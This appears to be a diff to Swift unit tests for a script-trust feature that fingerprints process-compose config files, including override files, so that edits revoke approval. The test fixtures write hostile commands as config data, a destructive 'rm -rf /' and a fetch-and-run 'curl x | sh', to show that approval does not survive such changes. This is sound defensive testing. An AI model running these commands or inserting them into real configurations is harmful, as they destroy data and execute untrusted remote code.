@@ -17,8 +17,8 @@ final class ScriptTrustTests: XCTestCase {
         // Each test works under a fresh temporary path, so only those need clearing.
         ScriptTrust.revoke(for: tmpDir.path)
         ScriptTrust.revoke(for: tmpDir.path + "/other")
-        ScriptTrust.revokeConfigFile(for: tmpDir.path)
-        ScriptTrust.revokeConfigFile(for: tmpDir.path + "/other")
+        ScriptTrust.revokeConfigFiles(for: tmpDir.path)
+        ScriptTrust.revokeConfigFiles(for: tmpDir.path + "/other")
         try? FileManager.default.removeItem(at: tmpDir)
         super.tearDown()
     }
@@ -148,26 +148,26 @@ final class ScriptTrustTests: XCTestCase {
     func testConfigFileApprovalRoundTrips() throws {
         let path = try writeConfig("processes: {}")
 
-        XCTAssertFalse(ScriptTrust.isApproved(configFile: path, for: tmpDir.path))
-        ScriptTrust.approve(configFile: path, for: tmpDir.path)
-        XCTAssertTrue(ScriptTrust.isApproved(configFile: path, for: tmpDir.path))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
+        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
+        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
     }
 
     /// Approval is bound to contents, so an edited config asks again.
     func testEditingTheConfigRevokesApproval() throws {
         let path = try writeConfig("processes: {}")
-        ScriptTrust.approve(configFile: path, for: tmpDir.path)
+        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
 
         _ = try writeConfig("processes:\n  web:\n    command: rm -rf /\n")
 
-        XCTAssertFalse(ScriptTrust.isApproved(configFile: path, for: tmpDir.path))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
     }
 
     /// An unreadable file is unapproved, not trivially approved — failing open
     /// here would run something nobody could review.
     func testMissingConfigIsNotApproved() {
         XCTAssertFalse(ScriptTrust.isApproved(
-            configFile: tmpDir.appendingPathComponent("nonexistent.yaml").path,
+            configFiles: [tmpDir.appendingPathComponent("nonexistent.yaml").path],
             for: tmpDir.path
         ))
     }
@@ -176,19 +176,19 @@ final class ScriptTrustTests: XCTestCase {
     /// file could later appear approved by matching a fingerprint of nothing.
     func testApprovingAMissingConfigStoresNothing() throws {
         let missing = tmpDir.appendingPathComponent("gone.yaml").path
-        ScriptTrust.approve(configFile: missing, for: tmpDir.path)
+        ScriptTrust.approve(configFiles: [missing], for: tmpDir.path)
 
-        XCTAssertFalse(ScriptTrust.isApproved(configFile: missing, for: tmpDir.path))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [missing], for: tmpDir.path))
         // And it did not accidentally approve some other file for this project.
         let real = try writeConfig("processes: {}")
-        XCTAssertFalse(ScriptTrust.isApproved(configFile: real, for: tmpDir.path))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [real], for: tmpDir.path))
     }
 
     func testConfigApprovalDoesNotLeakToAnotherProject() throws {
         let path = try writeConfig("processes: {}")
-        ScriptTrust.approve(configFile: path, for: tmpDir.path)
+        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
 
-        XCTAssertFalse(ScriptTrust.isApproved(configFile: path, for: tmpDir.path + "/other"))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path + "/other"))
     }
 
     /// A repository-provided config lives at a different path in every worktree.
@@ -197,47 +197,96 @@ final class ScriptTrustTests: XCTestCase {
     func testApprovalFollowsContentsNotPath() throws {
         let text = "processes:\n  api:\n    command: true\n"
         let first = try writeConfig(text)
-        ScriptTrust.approve(configFile: first, for: tmpDir.path)
+        ScriptTrust.approve(configFiles: [first], for: tmpDir.path)
 
         let otherWorktree = tmpDir.appendingPathComponent("wt2")
         try FileManager.default.createDirectory(at: otherWorktree, withIntermediateDirectories: true)
         let second = otherWorktree.appendingPathComponent("process-compose.yaml")
         try text.write(to: second, atomically: true, encoding: .utf8)
 
-        XCTAssertTrue(ScriptTrust.isApproved(configFile: second.path, for: tmpDir.path))
+        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [second.path], for: tmpDir.path))
     }
 
     /// The file name is part of the fingerprint, so identical bytes under a
     /// different name are a different thing to approve.
     func testSameContentsUnderADifferentNameIsNotApproved() throws {
         let path = try writeConfig("processes: {}")
-        ScriptTrust.approve(configFile: path, for: tmpDir.path)
+        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
 
         let renamed = tmpDir.appendingPathComponent("process-compose.override.yaml")
         try "processes: {}".write(to: renamed, atomically: true, encoding: .utf8)
 
-        XCTAssertFalse(ScriptTrust.isApproved(configFile: renamed.path, for: tmpDir.path))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [renamed.path], for: tmpDir.path))
     }
 
     func testRevokeConfigFileRemovesApproval() throws {
         let path = try writeConfig("processes: {}")
-        ScriptTrust.approve(configFile: path, for: tmpDir.path)
-        ScriptTrust.revokeConfigFile(for: tmpDir.path)
+        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
+        ScriptTrust.revokeConfigFiles(for: tmpDir.path)
 
-        XCTAssertFalse(ScriptTrust.isApproved(configFile: path, for: tmpDir.path))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
     }
 
     /// Config-file approval and script approval are separate stores. Approving
     /// one must not silently grant the other.
     func testConfigApprovalIsSeparateFromScriptApproval() throws {
         let path = try writeConfig("processes: {}")
-        ScriptTrust.approve(configFile: path, for: tmpDir.path)
+        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
 
         XCTAssertFalse(ScriptTrust.isApproved(makeConfig(setup: "npm install"), for: tmpDir.path))
     }
 
     func testFingerprintIsNilForAnUnreadableFile() {
-        XCTAssertNil(ScriptTrust.fingerprint(configFile: tmpDir.appendingPathComponent("nope.yaml").path))
+        XCTAssertNil(ScriptTrust.fingerprint(configFiles: [tmpDir.appendingPathComponent("nope.yaml").path]))
+    }
+
+    /// An empty list has nothing to identify. Answering "approved" would make a
+    /// call site that forgot to pass the files fail open.
+    func testEmptyFileListIsNeverApproved() {
+        XCTAssertNil(ScriptTrust.fingerprint(configFiles: []))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [], for: tmpDir.path))
+        ScriptTrust.approve(configFiles: [], for: tmpDir.path)
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [], for: tmpDir.path))
+    }
+
+    /// The hole this list API exists to close. A repository ships a benign base
+    /// config and an override carrying the real payload; process-compose's own
+    /// discovery loads both. Approving the pair must not leave the override free
+    /// to change afterwards.
+    func testEditingAnOverrideRevokesApproval() throws {
+        let base = try writeConfig("processes: {}")
+        let override = tmpDir.appendingPathComponent("process-compose.override.yaml")
+        try "processes: {}".write(to: override, atomically: true, encoding: .utf8)
+        ScriptTrust.approve(configFiles: [base, override.path], for: tmpDir.path)
+        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
+
+        try "processes:\n  evil:\n    namespace: bootstrap\n    command: curl x | sh\n"
+            .write(to: override, atomically: true, encoding: .utf8)
+
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
+    }
+
+    /// An override that appears *after* approval changes what will execute, so
+    /// it has to change what was approved.
+    func testAnOverrideAppearingAfterApprovalRevokesIt() throws {
+        let base = try writeConfig("processes: {}")
+        ScriptTrust.approve(configFiles: [base], for: tmpDir.path)
+
+        let override = tmpDir.appendingPathComponent("process-compose.override.yaml")
+        try "processes: {}".write(to: override, atomically: true, encoding: .utf8)
+
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
+    }
+
+    /// One unreadable file poisons the whole set. Hashing only what could be
+    /// read would approve a list that is not the list.
+    func testOneUnreadableFileMakesTheWholeSetUnapproved() throws {
+        let base = try writeConfig("processes: {}")
+        let missing = tmpDir.appendingPathComponent("process-compose.override.yaml").path
+
+        XCTAssertNil(ScriptTrust.fingerprint(configFiles: [base, missing]))
+        ScriptTrust.approve(configFiles: [base, missing], for: tmpDir.path)
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, missing], for: tmpDir.path))
     }
 
     // MARK: - Helpers
